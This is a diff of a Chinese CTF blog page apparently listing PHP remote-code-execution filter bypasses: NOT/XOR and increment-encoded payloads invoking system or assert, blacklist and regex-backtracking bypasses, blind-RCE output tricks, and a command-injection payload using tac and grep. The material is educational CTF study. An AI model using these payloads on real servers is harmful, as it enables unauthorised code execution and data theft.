-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"> </span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"> </span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//取反传参</span><br><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;cat /flag&quot;;</span><br><span class="line"> </span><br><span class="line">$c = urlencode(~$a);</span><br><span class="line">$d = urlencode(~$b);</span><br><span class="line"> </span><br><span class="line">//输出得到取反传参内容</span><br><span class="line">echo &quot;?cmd=(~&quot;.$c.&quot;)(~&quot;.$d.&quot;);&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
 <h4 id="异或绕过"><a class="markdownIt-Anchor" href="#异或绕过">#</a> 异或绕过</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 异或构造Python脚本</span><br><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br><span class="line"> </span><br><span class="line">answer = input(&#x27;输入异或构造的字符串:&#x27;)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = &#x27;&#x27;, &#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if ord(i) ^ ord(j) == ord(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line"> </span><br><span class="line">print(f&#x27;&quot;&#123;tmp1&#125;&quot;^&quot;&#123;tmp2&#125;&quot;&#x27;)</span><br></pre></td></tr></table></figure></div>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//异或php脚本</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;phpinfo&#x27;;</span><br><span class="line">for ($i = 0;$i &lt;strlen($a);$i++)</span><br><span class="line">    echo &#x27;%&#x27;.dechex(ord($a[$i])^0xff);</span><br><span class="line">echo &quot;^&quot;;</span><br><span class="line">for ($j=0;$j&lt;strlen($a);$j++)</span><br><span class="line">    echo &#x27;%ff&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br></pre></td></tr></table></figure></div>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br><span class="line"> </span><br><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 异或构造Python脚本</span><br><span class="line">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br><span class="line"> </span><br><span class="line">answer = input(&#x27;输入异或构造的字符串:&#x27;)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = &#x27;&#x27;, &#x27;&#x27;</span><br><span class="line">for c in answer:</span><br><span class="line">    for i in valid:</span><br><span class="line">        for j in valid:</span><br><span class="line">            if ord(i) ^ ord(j) == ord(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line"> </span><br><span class="line">print(f&#x27;&quot;&#123;tmp1&#125;&quot;^&quot;&#123;tmp2&#125;&quot;&#x27;)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//异或php脚本</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;phpinfo&#x27;;</span><br><span class="line">for ($i = 0;$i &lt;strlen($a);$i++)</span><br><span class="line">    echo &#x27;%&#x27;.dechex(ord($a[$i])^0xff);</span><br><span class="line">echo &quot;^&quot;;</span><br><span class="line">for ($j=0;$j&lt;strlen($a);$j++)</span><br><span class="line">    echo &#x27;%ff&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[&#x27;mess&#x27;];</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span><br><span class="line"> </span><br><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure></div>
 <h4 id="自增绕过"><a class="markdownIt-Anchor" href="#自增绕过">#</a> 自增绕过</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//自增payload，assert($_POST[_]),命令传入_</span><br><span class="line"> </span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&amp;_=phpinfo();</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//自增payload，assert($_POST[_]),命令传入_</span><br><span class="line"> </span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&amp;_=phpinfo();</span><br></pre></td></tr></table></figure></div>
 <h4 id="黑名单绕过"><a class="markdownIt-Anchor" href="#黑名单绕过">#</a> 黑名单绕过</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//变量拼接，如flag被过滤</span><br><span class="line">将：</span><br><span class="line">cat /flag</span><br><span class="line">替换为：</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line"> </span><br><span class="line">//读取根目录</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););</span><br><span class="line">//读flag</span><br><span class="line">eval(var_dump(file_get_contents($_POST[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//等效于打开ls目录下的文件</span><br><span class="line">cat `ls`</span><br><span class="line"> </span><br><span class="line">//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_</span><br><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br><span class="line"> </span><br><span class="line">//php标签绕过</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//变量拼接，如flag被过滤</span><br><span class="line">将：</span><br><span class="line">cat /flag</span><br><span class="line">替换为：</span><br><span class="line">b=ag;cat /fl$b</span><br><span class="line"> </span><br><span class="line">//读取根目录</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););</span><br><span class="line">//读flag</span><br><span class="line">eval(var_dump(file_get_contents($_POST[&#x27;a&#x27;])););&amp;a=/flag</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//等效于打开ls目录下的文件</span><br><span class="line">cat `ls`</span><br><span class="line"> </span><br><span class="line">//_被过滤，php8以下，变量名中的第一个非法字符[会被替换为下划线_</span><br><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br><span class="line"> </span><br><span class="line">//php标签绕过</span><br><span class="line">?&gt;&lt;?= phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -461,18 +457,56 @@ ls -t ：按照时间将文本排序输出<br>
                       alt="image-20241031220300782"
                 ></p>
 <h4 id="回溯绕过"><a class="markdownIt-Anchor" href="#回溯绕过">#</a> 回溯绕过</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//php正则的回溯次数大于1000000次时返回False</span><br><span class="line">$a = &#x27;hello world&#x27;+&#x27;h&#x27;*1000000</span><br><span class="line">preg_match(&quot;/hello.*world/is&quot;,$a) == False</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//php正则的回溯次数大于1000000次时返回False</span><br><span class="line">$a = &#x27;hello world&#x27;+&#x27;h&#x27;*1000000</span><br><span class="line">preg_match(&quot;/hello.*world/is&quot;,$a) == False</span><br></pre></td></tr></table></figure></div>
 <h4 id="无回显rce"><a class="markdownIt-Anchor" href="#无回显rce">#</a> 无回显 RCE</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()无输出</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()无输出</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure></div>
 <p>参考文章</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131557169?spm=1001.2014.3001.5506" >RCE 漏洞详解及绕过总结 (全面)-CSDN 博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84466229/article/details/139718772?ops_request_misc=%7B%22request%5Fid%22%3A%22371BBCBE-D0CD-41EE-B593-139D2E5FF9EE%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=371BBCBE-D0CD-41EE-B593-139D2E5FF9EE&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139718772-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=ctf%E4%B8%AD%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84rce%E9%A2%98%E7%9B%AE&amp;spm=1018.2226.3001.4187" >CTF 中的 RCE_rced 在 ctf 中是什么意思 - CSDN 博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131557169?spm=1001.2014.3001.5506" >RCE 漏洞详解及绕过总结 (全面)-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84466229/article/details/139718772?ops_request_misc=%7B%22request%5Fid%22%3A%22371BBCBE-D0CD-41EE-B593-139D2E5FF9EE%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=371BBCBE-D0CD-41EE-B593-139D2E5FF9EE&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139718772-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=ctf%E4%B8%AD%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84rce%E9%A2%98%E7%9B%AE&amp;spm=1018.2226.3001.4187" >CTF 中的 RCE_rced 在 ctf 中是什么意思 - CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>php 短标签，有三种方式：(用于 eval (&quot;?&gt;&quot;.$word); 这样的情况，用？&gt; 闭合了前面的语句)</p>
+<? echo '123';?> #前提是开启配置参数short_open_tags=on
+<script language="php">echo 'hello'; #不需要修改参数开关，但是只能在7.0以下可用。
+<% echo '123';%> #开启配置参数asp_tags=on，并且只能在7.0以下版本使用
 
-        </div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+
+
+
+
+
+
+##### grep函数
+
+`grep` 是 Linux 和 Unix 系统中一个非常强大的文本搜索工具，用于在文件或输入流中查找匹配指定模式的行。以下是 `grep` 的常用用法和示例：
+
+------
+
+### **基本语法**
+
+bash
+
+复制
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [选项] 模式 [文件...]</span><br></pre></td></tr></table></figure></div>
+
+- **模式**：要搜索的字符串或正则表达式。
+- **文件**：要搜索的文件（可以是一个或多个文件）。如果未指定文件，`grep` 会从标准输入读取数据。
+
+例如这个payload
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff=269afa1c6d77e37919c94f9c75a028819193c7b51aee2d46222cda81fe154538&amp;One-ear=;tac f*|grep \&#123;&amp;White-cat-monitor[]=3</span><br></pre></td></tr></table></figure></div>
+
+题目
+
+![image-20250303215426843](https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20250303215426843.png)
+
+这里用;闭合了前面的nc   之后用grep函数去匹配flag肯定会有的前大括号
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>标题:</strong> CTF中的RCE</li>
         <li><strong>作者:</strong> The Redefine Team</li>
@@ -481,7 +515,7 @@ ls -t ：按照时间将文本排序输出<br>
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-10-31 22:04:22
+                    :</strong> 2025-03-03 21:58:28
             </li>
         
         <li>
@@ -500,54 +534,48 @@ ls -t ：按照时间将文本排序输出<br>
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
+		
 
-        
+		
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/11/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">文件上传</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/2024/10/23/hello-world/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Hello World</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CTF中的RCE</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/10/23/hello-world/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Hello World</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
         评论
@@ -587,36 +615,30 @@ ls -t ：按照时间将文本排序输出<br>
     
 </div>
 
-            </div>
-        
-    </div>
+		</div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">目录</div>
-        <div class="page-title">CTF中的RCE</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rce%E7%BB%95%E8%BF%87"><span class="nav-text"> rce 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#image-20241031205501710"><span class="nav-text"> </span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text"> 关键字绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text"> 空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="nav-text"> 转义绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="nav-text"> 特殊变量绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text"> Base64 编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E6%B3%95"><span class="nav-text"> 拼接法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E3%83%8E%CF%89%E3%83%8E"><span class="nav-text"> 字符串长度限制 (ﾉ*･ω･)ﾉ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#path-%E3%83%8E%CF%89%E3%83%8E"><span class="nav-text"> $PATH (ﾉ*･ω･)ﾉ</span></a></li></ol></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">CTF中的RCE</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rce%E7%BB%95%E8%BF%87"><span class="nav-text"> rce 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#image-20241031205501710"><span class="nav-text"> </span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="nav-text"> 关键字绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-text"> 空格绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="nav-text"> 转义绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="nav-text"> 特殊变量绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text"> Base64 编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E6%B3%95"><span class="nav-text"> 拼接法</span></a><ol 